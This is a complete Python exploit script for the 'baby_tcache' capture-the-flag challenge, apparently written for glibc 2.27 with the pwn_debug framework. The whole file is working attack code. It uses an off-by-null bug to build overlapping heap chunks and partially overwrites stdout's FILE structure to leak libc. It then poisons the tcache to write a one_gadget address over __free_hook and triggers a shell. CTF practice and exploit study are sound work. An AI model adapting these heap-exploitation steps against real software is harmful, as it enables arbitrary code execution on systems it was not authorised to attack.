# File: exp.py
# Author: raycp
# Date: 2019-06-03
# Description: exp for baby_tcache, unlink to form overlap chunk by off-by-null vuln,bruteforce to overwrite stdout to leak

from pwn_debug import *


pdbg=pwn_debug("./baby_tcache")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.27.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def new(size,content):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(content)


def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def mute_new(size,content):
    time.sleep(0.3)
    p.sendline("1")
    time.sleep(0.3)
    p.sendline(str(size))
    time.sleep(0.3)
    p.send(content)


def mute_delete(idx):
    time.sleep(0.3)
    p.sendline("2")
    time.sleep(0.3)
    p.sendline(str(idx))

def pwn():

    ## chunk with size bigger than 0x400 will be put into unsorted bin directly.
    
    #pdbg.bp()
    
    new(0x410,'a') #0
    new(0x80,'a') #1
    new(0x4f0,'b') #2
    new(0x80,'b') #3
    new(0xa0,'c') #4
    new(0xa0,'c') #5
    delete(0)
    delete(1)
    

    #pdbg.bp(0xe3a)
    ## fake prev size will be 0x420+0x90  and prev inuse will be null by off-by-null
    new(0x88,'a'*0x80+p64(0x420+0x90)) #0

    #delete(0)

    delete(2)  # merge with chunk 0x420

    delete(0)

    
    new(0x410,'a') #0

    guess_stdout=membp.libc_base+libc.symbols['_IO_2_1_stdout_']
    read_end=guess_stdout+0x10
    write_base=guess_stdout+0x20
    write_end=guess_stdout+0x28
    target=guess_stdout+0x88
    log.info("guess stdout: %s"%(hex(guess_stdout)))

    #pdbg.bp([0xe3a,0xd1c])
    new(0xa0,p16(write_end&0xffff)) #1
    new(0x80,'a')         #2
    new(0x80,p16((target+8)&0xffff)) #3


    #pdbg.bp([0xe3a,0xd1c])

    p.recv(5)
    libc_addr=u64(p.recv(8))
    #libc_base=libc_addr-libc.symbols['_IO_stdfile_1_lock']
    libc_base=libc_addr-0x3ed8c0
    free_hook=libc_base+libc.symbols['__free_hook']
    rce=libc_base+0x4f322 
    log.info("leak libc base: %s" %(hex(libc_base)))

    delete(1)
    delete(2)
    new(0xa0,p64(free_hook))
    new(0xa0,'\x00')
    new(0xa0,p64(rce))
    pdbg.bp(command=['b *%s'%(hex(rce))])
    #


    # trigger free to get shell
    delete(1)
    
    p.interactive() 

if __name__ == '__main__':
   pwn()


